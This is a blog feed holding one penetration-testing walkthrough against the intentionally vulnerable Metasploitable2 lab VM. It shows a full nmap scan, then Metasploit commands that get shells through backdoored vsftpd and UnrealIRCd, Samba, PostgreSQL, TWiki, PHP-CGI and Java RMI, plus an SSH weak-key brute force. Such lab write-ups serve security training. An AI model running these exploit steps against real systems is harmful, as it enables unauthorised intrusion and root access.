<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Bob1Bob2]]></title>
  <link href="http://wg135.github.io/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-07T10:53:15-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[metasploitable2]]></title>
    <link href="http://wg135.github.io/blog/2016/06/22/metasploitable2/"/>
    <updated>2016-06-22T15:18:00-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/22/metasploitable2</id>
    <content type="html"><![CDATA[<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Metasploit</li>
<li>smbclient</li>
<li>enum4linux</li>
<li>Nikto</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.179 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.179 -p-</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>e-scanning.
</span><span class='line'>Initiating NSE at 15:46
</span><span class='line'>Completed NSE at 15:46, 0.00s elapsed
</span><span class='line'>Initiating NSE at 15:46
</span><span class='line'>Completed NSE at 15:46, 0.00s elapsed
</span><span class='line'>Initiating ARP Ping Scan at 15:46
</span><span class='line'>Scanning 192.168.79.179 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 15:46, 0.00s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 15:46
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 15:46, 2.04s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 15:46
</span><span class='line'>Scanning 192.168.79.179 [65535 ports]
</span><span class='line'>Discovered open port 21/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 23/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 80/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 22/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 3306/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 5900/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 139/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 111/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 445/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 53/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 25/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 2049/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 6697/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 52739/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 5432/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 513/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 57206/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 6000/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 514/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 8787/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 1524/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 1099/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 47980/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 8009/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 3632/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 2121/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 8180/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 6667/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 57218/tcp on 192.168.79.179
</span><span class='line'>Discovered open port 512/tcp on 192.168.79.179
</span><span class='line'>Completed SYN Stealth Scan at 15:46, 0.83s elapsed (65535 total ports)
</span><span class='line'>Initiating Service scan at 15:46
</span><span class='line'>Scanning 30 services on 192.168.79.179
</span><span class='line'>Completed Service scan at 15:48, 141.15s elapsed (30 services on 1 host)
</span><span class='line'>Initiating OS detection (try #1) against 192.168.79.179
</span><span class='line'>NSE: Script scanning 192.168.79.179.
</span><span class='line'>Initiating NSE at 15:48
</span><span class='line'>Completed NSE at 15:49, 62.29s elapsed
</span><span class='line'>Initiating NSE at 15:49
</span><span class='line'>Completed NSE at 15:49, 1.02s elapsed
</span><span class='line'>Nmap scan report for 192.168.79.179
</span><span class='line'>Host is up (0.00013s latency).
</span><span class='line'>Not shown: 65505 closed ports
</span><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>21/tcp    open  ftp         vsftpd 2.3.4
</span><span class='line'>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
</span><span class='line'>|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
</span><span class='line'>23/tcp    open  telnet      Linux telnetd
</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
</span><span class='line'>|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Public Key type: rsa
</span><span class='line'>| Public Key bits: 1024
</span><span class='line'>| Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'>| Not valid before: 2010-03-17T14:07:45
</span><span class='line'>| Not valid after:  2010-04-16T14:07:45
</span><span class='line'>| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
</span><span class='line'>|_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
</span><span class='line'>|_ssl-date: 2016-06-22T20:48:28+00:00; -23s from scanner time.
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.4.2
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.4.2
</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
</span><span class='line'>|_http-title: Metasploitable2 - Linux
</span><span class='line'>111/tcp   open  rpcbind     2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      40038/udp  mountd
</span><span class='line'>|   100005  1,2,3      47980/tcp  mountd
</span><span class='line'>|   100021  1,3,4      36995/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      57218/tcp  nlockmgr
</span><span class='line'>|   100024  1          52739/tcp  status
</span><span class='line'>|_  100024  1          60788/udp  status
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>512/tcp   open  exec        netkit-rsh rexecd
</span><span class='line'>513/tcp   open  login?
</span><span class='line'>514/tcp   open  tcpwrapped
</span><span class='line'>1099/tcp  open  rmiregistry GNU Classpath grmiregistry
</span><span class='line'>1524/tcp  open  shell       Metasploitable root shell
</span><span class='line'>2049/tcp  open  nfs         2-4 (RPC #100003)
</span><span class='line'>2121/tcp  open  ftp         ProFTPD 1.3.1
</span><span class='line'>3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 53
</span><span class='line'>|   Version: .0.51a-3ubuntu5
</span><span class='line'>|   Thread ID: 10
</span><span class='line'>|   Capabilities flags: 43564
</span><span class='line'>|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|_  Salt: 0o_q:k/GUV24Mf&lt;6:aZ~
</span><span class='line'>3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
</span><span class='line'>5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Public Key type: rsa
</span><span class='line'>| Public Key bits: 1024
</span><span class='line'>| Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'>| Not valid before: 2010-03-17T14:07:45
</span><span class='line'>| Not valid after:  2010-04-16T14:07:45
</span><span class='line'>| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
</span><span class='line'>|_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
</span><span class='line'>|_ssl-date: 2016-06-22T20:48:28+00:00; -22s from scanner time.
</span><span class='line'>5900/tcp  open  vnc         VNC (protocol 3.3)
</span><span class='line'>| vnc-info: 
</span><span class='line'>|   Protocol version: 3.3
</span><span class='line'>|   Security types: 
</span><span class='line'>|_    Unknown security type (33554432)
</span><span class='line'>6000/tcp  open  X11         (access denied)
</span><span class='line'>6667/tcp  open  irc         Unreal ircd
</span><span class='line'>6697/tcp  open  irc         Unreal ircd
</span><span class='line'>| irc-info: 
</span><span class='line'>|   users: 2
</span><span class='line'>|   servers: 1
</span><span class='line'>|   lusers: 2
</span><span class='line'>|   lservers: 0
</span><span class='line'>|   server: irc.Metasploitable.LAN
</span><span class='line'>|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
</span><span class='line'>|   uptime: 0 days, 0:37:22
</span><span class='line'>|   source ident: nmap
</span><span class='line'>|   source host: DCF8F1B0.E9B94EC6.FFFA6D49.IP
</span><span class='line'>|_  error: Closing Link: jpmvzpmdu[192.168.79.173] (Quit: jpmvzpmdu)
</span><span class='line'>8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
</span><span class='line'>|_ajp-methods: Failed to get a valid response for the OPTION request
</span><span class='line'>8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>|_http-favicon: Apache Tomcat
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat/5.5
</span><span class='line'>8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
</span><span class='line'>47980/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>52739/tcp open  status      1 (RPC #100024)
</span><span class='line'>57206/tcp open  unknown
</span><span class='line'>57218/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>MAC Address: 00:0C:29:B1:FE:27 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Uptime guess: 0.023 days (since Wed Jun 22 15:16:04 2016)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=204 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| Names:
</span><span class='line'>|   METASPLOITABLE&lt;00&gt;   Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   METASPLOITABLE&lt;03&gt;   Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   METASPLOITABLE&lt;20&gt;   Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'>|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 3.0.20-Debian)
</span><span class='line'>|   NetBIOS computer name: 
</span><span class='line'>|   Workgroup: WORKGROUP
</span><span class='line'>|_  System time: 2016-06-22T16:48:29-04:00
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.13 ms 192.168.79.179
</span><span class='line'>
</span><span class='line'>NSE: Script Post-scanning.
</span><span class='line'>Initiating NSE at 15:49
</span><span class='line'>Completed NSE at 15:49, 0.00s elapsed
</span><span class='line'>Initiating NSE at 15:49
</span><span class='line'>Completed NSE at 15:49, 0.00s elapsed
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 209.95 seconds
</span><span class='line'>           Raw packets sent: 65555 (2.885MB) | Rcvd: 65552 (2.623MB)</span></code></pre></td></tr></table></div></figure>


<h3>vsftpd exploit (port 21):</h3>

<p>search vsftpd</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; exploit </span></code></pre></td></tr></table></div></figure>


<p>get the root:</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<h3>postgresql exploit</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/postgres/postgres_payload
</span><span class='line'>msf exploit(postgres_payload) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(postgres_payload) &gt; exploit</span></code></pre></td></tr></table></div></figure>


<p>get meterpreter:</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<h3>SSH exploit (port 22):</h3>

<p>Getting access to a system with a writeable filesystem</p>

<p><a href="https://github.com/wg135/script/blob/master/add_ssh_key.py">add_ssh_key.py</a></p>

<p>Since the nmap shows the openssh version is 4.7. I googled it and find it use Openssl 0.9.8g</p>

<p>search openssl exploit:</p>

<p><code>searchsploit openssl</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like these exploits can be used. The vulnerability is CVE-2008-0166.</p>

<p>I use 5720.py.</p>

<p>First, download precalculated vulnerable keys</p>

<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2</code></p>

<p>unzip it</p>

<p><code>tar jxf 5622.tar.bz2</code></p>

<p>run the command:</p>

<p><code>python 5720.py rsa/2048/ 192.168.79.179 root 22 5</code></p>

<p>rsa/2048 is the folder contains the keys.</p>

<p>Found keys:</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>login the box:</p>

<p><code>ssh -l root -p22 -i rsa/2048//c551f0a5d2f76d88b58b3ae90ceb617a-22002 192.168.79.179</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<h3>TELNET exploit</h3>

<p>in msfconsole, search telnet</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/telnet/telnet_version
</span><span class='line'>msf auxiliary(telnet_version) &gt; set rhosts 192.168.79.179
</span><span class='line'>msf auxiliary(telnet_version) &gt; run
</span></code></pre></td></tr></table></div></figure>


<p>In the banner, shows username/password</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_025.png" title="[title manually exploit [alt text]]" ></p>

<p>or you can just <code>telnet 192.168.79.179</code> to grab the banner.</p>

<p>login</p>

<p><code>telnet 192.168.79.179 -l msfadmin</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_026.png" title="[title manually exploit [alt text]]" ></p>

<h3>Twiki (port 80)</h3>

<p>Nagviate to port 80. there is a Twiki, search twiki, find a  exploit</p>

<p><code>exploit/unix/webapp/twiki_history</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use  exploit/unix/webapp/twiki_history
</span><span class='line'>msf exploit(twiki_history) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(twiki_history) &gt; exploit</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_028.png" title="[title manually exploit [alt text]]" ></p>

<h3>phpinfo.php</h3>

<p>Use nikto, I found the page phpinfo.php is availabe.</p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_029.png" title="[title manually exploit [alt text]]" ></p>

<p>I got the php version is 5.2.4.</p>

<p>search the php_cgi</p>

<p>found the exploit <code>exploit/multi/http/php_cgi_arg_injection</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_030.png" title="[title manually exploit [alt text]]" ></p>

<p>may be the vulberable version.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/php_cgi_arg_injection
</span><span class='line'>msf exploit(php_cgi_arg_injection) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(php_cgi_arg_injection) &gt; exploit</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_031.png" title="[title manually exploit [alt text]]" ></p>

<h3>SMB exploit:</h3>

<p>Enumerate smtp:</p>

<p><code>enum4linux 192.168.79.179</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like <a href="https://www.samba.org/samba/news/symlink_attack.html">wide links</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/admin/smb/samba_symlink_traversal
</span><span class='line'>msf auxiliary(samba_symlink_traversal) &gt; set rhost 192.168.79.179
</span><span class='line'>msf auxiliary(samba_symlink_traversal) &gt; set SMBSHARE tmp
</span><span class='line'>msf auxiliary(samba_symlink_traversal) &gt; exploit
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>looks good</p>

<p>now use smbclient to login</p>

<p><code>smbclient //192.168.79.179/tmp</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>since the samba version is 3.0.20, I found this module:</p>

<p><code>exploit/multi/samba/usermap_script</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/samba/usermap_script
</span><span class='line'>msf exploit(usermap_script) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(usermap_script) &gt; exploit
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<h3>Unreal ircd exploit</h3>

<p><code>msf &gt; search unreal ircd</code></p>

<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>same version</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set rhost 192.168.79.179
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; exploit</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<h3>Java-rmi (port 1099)</h3>

<p>Nmap shows port 1099 rmiregistry GNU Classpath grmiregistry</p>

<p>in metasploit search rmiregistry, got one exploit</p>

<p><code>exploit/multi/misc/java_rmi_server</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/misc/java_rmi_server
</span><span class='line'>msf exploit(java_rmi_server) &gt; set rhost 192.168.79.17
</span><span class='line'>msf exploit(java_rmi_server) &gt; exploit
</span><span class='line'>msf exploit(java_rmi_server) &gt; sessions -i 1</span></code></pre></td></tr></table></div></figure>


